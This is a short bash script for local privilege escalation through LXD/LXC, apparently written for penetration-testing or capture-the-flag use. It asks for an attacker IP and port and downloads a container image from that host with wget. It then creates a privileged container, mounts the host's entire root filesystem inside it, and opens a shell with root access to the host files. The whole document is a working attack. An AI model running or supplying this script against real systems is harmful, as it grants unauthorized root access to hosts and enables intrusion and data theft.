#!/bin/bash

read -p "What is your attacker ip?: " ip
read -p "What is your port?: " port

wget http://$ip:$port/incus.tar.xz
wget http://$ip:$port/rootfs.squashfs

lxc image import incus.tar.xz rootfs.squashfs --alias alpine

#Check the image is there:
lxc image list

#Create the container:
lxc init alpine privesc -c security.privileged=true

#List containers:
lxc list

#Set up privesc:
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#Execute privesc:
lxc start privesc
lxc exec privesc /bin/sh

#Here is where the filesystem is mounted:
cd /mnt/root 